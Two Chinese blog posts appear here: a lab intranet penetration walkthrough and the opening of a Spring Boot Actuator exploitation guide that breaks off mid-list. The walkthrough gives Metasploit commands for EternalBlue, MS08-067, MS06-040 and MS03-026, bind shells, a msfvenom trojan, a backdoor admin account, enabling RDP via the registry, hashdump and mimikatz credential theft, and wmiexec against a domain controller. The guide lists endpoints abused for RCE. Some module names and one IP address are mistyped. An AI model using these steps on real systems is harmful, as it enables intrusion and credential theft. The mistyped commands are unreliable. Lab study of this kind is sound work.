<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln  192.168.52.141</span><br></pre></td></tr></table></figure>

<p>这里的nmap扫描并没有成功</p>
<p>尝试使用/scanner/smb/ms17_010_commmand模块对目标进行扫描,发现目标可能存在ms17_010</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use  auxiliary/scanner/smb/smb_ms17has</span><br><span class="line">set rhosts 192.168.52.141</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808220259617.png" alt="image-20210808220259617"></p>
<p>下面使用admin/smb/ms17_010_command模块对该主机的ms17_010判断是否为可以利用和执行的权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use  admin/smb/ms17_010_command</span><br></pre></td></tr></table></figure>

<p>可以看到目标主机执行的权限为Administrator管理员权限</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808221620326.png" alt="image-20210808221620326"></p>
<p>接下来就是对目标主机的ms17-010进行漏洞利用拿到目标shell</p>
<p>我首先使用的是exploit/windows/smb/ms17_010_eternablue模块的windows/x64/meterpreter/reverse_tcp的payload，但是管道并没有创建成功，由于目标内网不能连接攻击主机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_enternablue</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809104223573.png" alt="image-20210809104223573"></p>
<p>接着使用了windows/smb/ms17_010_pspexec模块的windows/shell/bind_tcp的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"></span><br><span class="line">set payload windows/shell/bind_tcp</span><br></pre></td></tr></table></figure>



<p>这个payload可以让目标主机开通个tcp监视器，然后让攻击主机去连接目标主机端口就可以执行shell</p>
<p>攻击成功，进入win2003的shell</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809104415099.png" alt="image-20210809104415099"></p>
<p>获取目标主机权限后，首先查看权限级别是否为管理员权限，然后考虑提权的问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure>

<p>可以看到此时执行的权限为system，系统管理员权限</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809104902785.png" alt="image-20210809104902785"></p>
<p>查看目标主机的系统相关信息，特别是补丁等信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809172615660.png" alt="image-20210809172615660"></p>
<p>由于此时的荷载直接就进入cmd窗口并不能使用工具，而且该权限为管理员权限，有两条思路:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.添加新用户将其放入管理员用户组中以管理员的权限执行(添加用户原因是因为我们不知道管理员的密码无法登录)，然后开通3389(远程桌面)、22(ssh端口)等端口，通过连接前面的端口服务将生成的后台木马传入目标主机，然后使用msf等待上线。使用mimikatz、hashdump等来读内存和注册表中的密码，因为域内该主机的系统是Winserver 2008,默认存储明文密码，不需要进行sha1解密等</span><br><span class="line"></span><br><span class="line">2.寻找其他攻击载荷，直接通过msf拿到session</span><br></pre></td></tr></table></figure>



<p><strong>1.添加管理员组新用户，开通敏感服务连接上传木马</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net   user    haoyun        Yzt096877     /add                            ###添加haoyun用户</span><br><span class="line">           </span><br><span class="line">net   user   localgroup   administrators     haoyun     /add              ###添加haoyun到管理员用户组中</span><br></pre></td></tr></table></figure>



<p>开启3389远程桌面服务，要在cmd窗口开启3389端口通过修改注册表和使用内网穿透工具netsh等</p>
<p>由于这里没有办法上传netsh，只能通过在cmd修改注册表开启远程桌面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;              ###查询注册表键值</span><br><span class="line"></span><br><span class="line">reg delete &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections     ###删除注册表键值</span><br><span class="line"></span><br><span class="line">reg add     &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d   ###添加注册表键值修改FdenyTSConnections键值</span><br></pre></td></tr></table></figure>

<p>这是原来的注册表中的fDenyTSConnections 为0x1(十六进制)，当该值为1时，表示3389服务没有开启</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809142515031.png" alt="image-20210809142515031"></p>
<p>修改目标键值后，该键值为0，如下图:</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809143417396.png" alt="image-20210809143417396"></p>
<p>可以看到3389端口开启</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809143459976.png" alt="image-20210809143459976"></p>
<p>连接远程桌面有两种方式:</p>
<p>1.返回到msf中使用rdesktop命令连接目标主机的3389端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop   -a  16 -r disk:share=/root/shell  192.168.52.141   -u haoyun   -p  Yzt096877</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rdesktop相关命令参数:</span><br><span class="line">-f 全屏</span><br><span class="line">-a 16位色</span><br><span class="line">-u xxxxxx 登录用户，可选</span><br><span class="line">-p xxxxxx 登录密码，可选</span><br><span class="line">-r clipboard:PRIMARYCLIPBOARD 重要，剪贴板可以与远程桌面交互</span><br><span class="line">-a 16 颜色，可选，不过最高就是16位</span><br><span class="line">-z 压缩，可选</span><br><span class="line">-g 1024x768 分辨率，可选，缺省是一种比当前本地桌面低的分辨率</span><br><span class="line">-P 缓冲，可选</span><br><span class="line">-r disk:wj=/home/magicgod 映射虚拟盘，可选，会在远程机器的网上邻居里虚拟出一个映射盘，功能很强，甚至可以是软盘或光盘</span><br><span class="line">-r sound:off 关闭声音，当然也可以把远程发的声音映射到本地来。</span><br></pre></td></tr></table></figure>



<p>2.通过venom工具开启个代理，使用proxychains配置代理连接</p>
<p>venom连接成功后，开启代理9999端口</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809155333106.png" alt="image-20210809155333106"></p>
<p>然后配置proxychains配置文件，设置代理ip和端口为127.0.0.1 999</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim   /etc/proxychains.conf</span><br><span class="line"></span><br><span class="line">在配置文件最后一行修改为自己的代理端口</span><br><span class="line">socks5  127.0.0.1  9999         </span><br></pre></td></tr></table></figure>



<p>然后使用rdesktop连接内网远程桌面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains   rdesktop  192.168.52.141  -r disk:share=/root/shell</span><br></pre></td></tr></table></figure>

<p>输入账号密码后，连接成功</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809155853825.png" alt="image-20210809155853825"></p>
<p>将msfvenom生成的木马通过远程桌面传入目标主机</p>
<p>这里使用上面的反弹shell连接失败，没有返回通道(因为内网主机无法通过跳板机来连接攻击主机，而只有攻击主机才能去连接内网主机，所以反向shell不能使用)。所以使用正向连接荷载生成木马bind.exe，将其上传到win2003上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp   ARCH=x86   PLATFROM=WIN Rhost=192.168.52.141 -f exe &gt; bind.exe</span><br></pre></td></tr></table></figure>



<p>在msf上使用exploit/multi/handler模块的正向payload  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use  exploit/multi/handler</span><br><span class="line">set payload  windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.52.141</span><br></pre></td></tr></table></figure>

<p>连接成功，管道打开</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809171049187.png" alt="image-20210809171049187"></p>
<p><strong>2.使用相关荷载攻击</strong></p>
<p>通过在漏洞库中搜索win2003相关的漏洞</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809172910901.png" alt="image-20210809172910901"></p>
<p>这里尝试ms08-067和ms06_040进行测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注:MS08-067漏洞将会影响除Windows Server 2008 Core以外的所有Windows系统，包括：Windows 2000/XP/Server 2003/Vista/Server 2008的各个版本，甚至还包括测试阶段的Windows 7 Pro-Beta</span><br></pre></td></tr></table></figure>



<p><strong>2.1 ms08-067漏洞利用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search ms08-067          ###搜索相关模块</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/bind_tcp    ###使用正向shell荷载</span><br><span class="line"></span><br><span class="line">set rhost 192.168.52.1141           ###设置目标主机Ip地址</span><br></pre></td></tr></table></figure>

<p>攻击成功，管道打开</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809173703941.png" alt="image-20210809173703941"></p>
<p><strong>2.2 ms06-040漏洞利用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">search  ms06-040</span><br><span class="line"></span><br><span class="line">use  exploit/windows/smb/ms06_040_netapi</span><br><span class="line"></span><br><span class="line">set payload  windows/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line">set rhost    192.168.52.141</span><br><span class="line"></span><br><span class="line">set target  5</span><br></pre></td></tr></table></figure>

<p>漏洞利用成功，攻击成功，管道打开</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809174522308.png" alt="image-20210809174522308"></p>
<p><strong>2.3 ms03-026漏洞利用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏洞实质上影响的是使用RPC的DCOM接口，此接口处理由客户端机器发送给服务器的DCOM对象激活请求(如UNC路径)。攻击者通过向目标发送畸形  RPC  DCOM请求来利用这些漏洞。成功利用此漏洞可以以本地系统权限执行任意指令。攻击者可以在系统上执行任意操作 ，如安装程序、查看或更改、删除数据或创建系统管理员权限的帐户</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search ms03-026</span><br><span class="line"></span><br><span class="line">use   exploit/windows/dcerpc/ms03_026_dcom</span><br><span class="line"></span><br><span class="line">set payload  windows/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line">set rhost  192.168.52.141</span><br></pre></td></tr></table></figure>



<p>漏洞利用成功，管道打开</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809175300540.png" alt="image-20210809175300540"></p>
<h4 id="凭证获取"><a href="#凭证获取" class="headerlink" title="凭证获取"></a>凭证获取</h4><p>如下获取用户账号和密码hash值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">或者</span><br><span class="line">run  post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>



<p>可以看到目标主机的用户账号和密码hash值</p>
<p>数据的输出格式为：用户名：SID：LM哈希：NTLM哈希:::</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210809175750389.png" alt="image-20210809175750389"></p>
<p>由于windows2008之前的操作系统密码存储都是以明文形式的，直接加载mimikatz模块后使用wdigest进行抓取</p>
<h4 id="域控主机获取"><a href="#域控主机获取" class="headerlink" title="域控主机获取"></a>域控主机获取</h4><h4 id="漏洞检测利用-1"><a href="#漏洞检测利用-1" class="headerlink" title="漏洞检测利用"></a>漏洞检测利用</h4><p>在之前的信息收集中，得到域控主机开放445和139端口，猜测也有可能存在ms17-010漏洞，对其进行漏洞检测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/smb/smb/smb_ms17_010</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>



<p>检测出来可能存在ms17-010漏洞</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810113004761.png" alt="image-20210810113004761"></p>
<p>然后检测是否是管理员权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use admin/smb/ms17_010_command</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>可以看到为管理员账户</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810120321187.png"></p>
<p>使用上面的ms17-010的模块都没有返回管道，建立会话失败</p>
<p>域控主机开放137，139，445端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果开启了137端口（wmi）首先还是建议用wmi , 可以直接利用`auxiliary/scanner/smb/impacket/wmiexec`来代码执行，就可以来开启3389 ，以及配置防火墙等。</span><br><span class="line"></span><br><span class="line">如果开启了`139，445`端口，可以先尝试用exploit/windows/smb/pspexec 来登录，弹正向shell.然后代码执行开启3389，配置防火墙</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WMIEXEC支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式。WMIEXEC需要提供账号密码进行远程连接，但是如果没有破解出账号密码，也可以配合WCE的hash注入功能一起使用，先进行hash注入，然后再使用WMIEXEC即可。</span><br></pre></td></tr></table></figure>



<p>下面使用wmiexec攻击模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use  auxiliary/scanner/impacket/wmicexec</span><br><span class="line">set rhost  192.168.52.138</span><br><span class="line">set SMBPass  域控密码</span><br><span class="line">set SMBUser  域控账号</span><br><span class="line">set command  执行的命令</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810142402809.png" alt="image-20210810142402809"></p>
<p>可以看到输入的命令执行成功，这样的话，可以开启远程桌面和使用共享文件将木马复制到域控主机上，然后开启正向shell监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\192.168.52.140\shell\shell.exe C:\1.exe</span><br></pre></td></tr></table></figure>



<p>原理:整个过程是先调用WMI通过账号密码或者NTLM认证（WCE注入）连接到远程计算机，然后如果提供了账号密码，则用这个账号密码建立一个到目标的IPC连接。随后WMI会建立一个共享文件夹，用于远程读取命令执行结果。</p>
<p>当用户输入命令时，WMI创建进程执行该命令，然后把结果输出到文件，这个文件位于之前创建的共享文件夹中。最后，通过FSO组件访问远程共享文件夹中的结果文件，将结果输出。当结果读取完成时，调用WMI执行命令删除结果文件。最后当WMIEXEC退出时，删除文件共享</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-Spring Boot Actuator未授权访问利用实战利用"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
     
    <div class="article-meta">
      <a href="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/" class="article-date">
  <time datetime="2021-10-22T10:23:46.643Z" itemprop="datePublished">2021-10-22</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Spring-Boot-集合"><a href="#Spring-Boot-集合" class="headerlink" title="Spring Boot 集合"></a><strong>Spring Boot 集合</strong></h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>Actuator是spring boot提供的用来对应用系统进行自省和监控的功能模块，借助于Actuator开发者可以很方便地对应用系统某些监控指标进行查看、统计等。如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息。Actuator配置不当会导致未授权访问获取网站相关配置甚至RCE</p>
<h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合</p>
<h3 id="组件版本相互依赖关系"><a href="#组件版本相互依赖关系" class="headerlink" title="组件版本相互依赖关系"></a>组件版本相互依赖关系</h3><p>![image-20210825221013561](Spring Boot Actuator未授权访问利用实战利用/image-20210825221013561.png)</p>
<h3 id="Spring-Cloud-与-Spring-Boot-版本之间的依赖关系"><a href="#Spring-Cloud-与-Spring-Boot-版本之间的依赖关系" class="headerlink" title="Spring Cloud 与 Spring Boot 版本之间的依赖关系"></a>Spring Cloud 与 Spring Boot 版本之间的依赖关系</h3><p>![image-20210825221109141](Spring Boot Actuator未授权访问利用实战利用/image-20210825221109141.png)</p>
<h3 id="Spring-Cloud-小版本号的后缀及含义"><a href="#Spring-Cloud-小版本号的后缀及含义" class="headerlink" title="Spring Cloud 小版本号的后缀及含义"></a>Spring Cloud 小版本号的后缀及含义</h3><p>![image-20210825221154274](Spring Boot Actuator未授权访问利用实战利用/image-20210825221154274.png)</p>
<p>[TOC]</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>环境准备：JDK 1.8 or later and Maven 3.2+</p>
<p>漏洞环境集合源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/18PSZvDxIRFwuNQBxo__4Ng </span><br><span class="line">提取码：jfzx </span><br></pre></td></tr></table></figure>



<p>下面是网盘中的资源包对应的命令执行漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">springboot-spel-rce包-------------------------------------命令执行2.1  </span><br><span class="line">springcloud-snakeyaml-rce包-------------------------------命令执行2.2</span><br><span class="line">actuator-testbed-master包---------------------------------命令执行2.3  2.4  2.5</span><br><span class="line">springboot-h2-database-rce包------------------------------命令执行2.6  2.8</span><br><span class="line">springboot-restart-rce包----------------------------------命令执行2.7  2.10 2.11 2.12</span><br><span class="line">springboot-mysql-jdbc-rce --------------------------------命令执行2.9</span><br><span class="line">maliciousRMIServer包包含RMI服务代码</span><br></pre></td></tr></table></figure>



<p>修改监听端口(不修改的话默认只能在搭建环境主机上访问)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src/main/resources/application.properties server.address=0.0.0.0</span><br></pre></td></tr></table></figure>



<p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn install</span><br></pre></td></tr></table></figure>



<p>启动服务(安装完成后会在主目录下生成后target文件夹，执行里面的jar包启动服务)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ./target/xxxxxxxx.jar</span><br></pre></td></tr></table></figure>

<p>![](Spring Boot Actuator未授权访问利用实战利用/a149799f8e8cf1d346efe3ee5649f3d1.png)</p>
<p>访问http:<em>//127.0.0.1:8090显示springboot欢迎页面</em></p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/733cfef5eb93509eee7b349f83def144.png)</p>
<p>当访问错误页面时，会提示错误信息</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/b84c0336ffa31a1c60da33c76f379659.png)</p>
<p>这里访问env就可以看到环境特性</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/0b00e02831d25ebd363910e0a85f6c16.png)</p>
<p>访问health显示应用的健康状态</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/e506922f3ff848db66817588eb0afe41.png)</p>
<h2 id="漏洞集合"><a href="#漏洞集合" class="headerlink" title="漏洞集合"></a>漏洞集合</h2><h3 id="1-信息泄露"><a href="#1-信息泄露" class="headerlink" title="1.信息泄露"></a>1.信息泄露</h3><h4 id="1-1-路由及接口调用详情泄露"><a href="#1-1-路由及接口调用详情泄露" class="headerlink" title="1.1.路由及接口调用详情泄露"></a>1.1.路由及接口调用详情泄露</h4><blockquote>
<p>开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等</p>
</blockquote>
<p>可以访问以下swagger相关路由进行验证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/v2/api-docs</span><br><span class="line">/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/swagger</span><br><span class="line">/api-docs</span><br><span class="line">/api.html</span><br><span class="line">/swagger-ui</span><br><span class="line">/swagger/codes</span><br><span class="line">/api/index.html</span><br><span class="line">/api/v2/api-docs</span><br><span class="line">/v2/swagger.json</span><br><span class="line">/swagger-ui/html</span><br><span class="line">/distv2/index.html</span><br><span class="line">/swagger/index.html</span><br><span class="line">/sw/swagger-ui.html</span><br><span class="line">/api/swagger-ui.html</span><br><span class="line">/static/swagger.json</span><br><span class="line">/user/swagger-ui.html</span><br><span class="line">/swagger-ui/index.html</span><br><span class="line">/swagger-dubbo/api-docs</span><br><span class="line">/template/swagger-ui.html</span><br><span class="line">/swagger/static/index.html</span><br><span class="line">/dubbo-provider/distv2/index.html</span><br><span class="line">/spring-security-rest/api/swagger-ui.html</span><br><span class="line">/spring-security-oauth-resource/swagger-ui.html</span><br></pre></td></tr></table></figure>



<p><strong>一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞</strong>，但是以 “<strong>默认安全</strong>“ 来讲，不暴露出这些信息更加安全。</p>
<p>对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞</p>
<p><strong>还有一些内置的端点路由由于未设置actuator访问控制暴露</strong></p>
<p>所有端点皆可以在org.springframework.boot.actuate.endpoint中找到表达的含义</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/33a5ec86aaddffe377ab51095d2b50db.png)</p>
<blockquote>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">注：Spring1.x在url跟路径下进行注册，在2.x版本中移动到/actuator的路径下：</span><br><span class="line"></span><br><span class="line">Spring1.x与2.x在post请求方面也存在差异，</span><br><span class="line"></span><br><span class="line">1.x通过application/x-www-form-urlencoded 进行post请求，</span><br><span class="line"></span><br><span class="line">2.x通过传递json包请求的applistion/json</span><br></pre></td></tr></table></figure>
</blockquote>
<p>其中对寻找漏洞比较重要接口的有：</p>
<ul>
<li><p><code>/env</code>、<code>/actuator/env</code></p>
<p>GET 请求 <code>/env</code> 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；</p>
<p>同时有一定概率可以通过 POST 请求 <code>/env</code> 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。</p>
</li>
<li><p><code>/refresh</code>、<code>/actuator/refresh</code></p>
<p>POST 请求 <code>/env</code> 接口设置属性后，可同时配合 POST 请求 <code>/refresh</code> 接口刷新属性变量来触发相关 RCE 漏洞。</p>
</li>
<li><p><code>/restart</code>、<code>/actuator/restart</code></p>
<p>暴露出此接口的情况较少；可以配合 POST请求 <code>/env</code> 接口设置属性后，再 POST 请求 <code>/restart</code> 接口重启应用来触发相关 RCE 漏洞。</p>
</li>
<li><p><code>/jolokia</code>、<code>/actuator/jolokia</code></p>
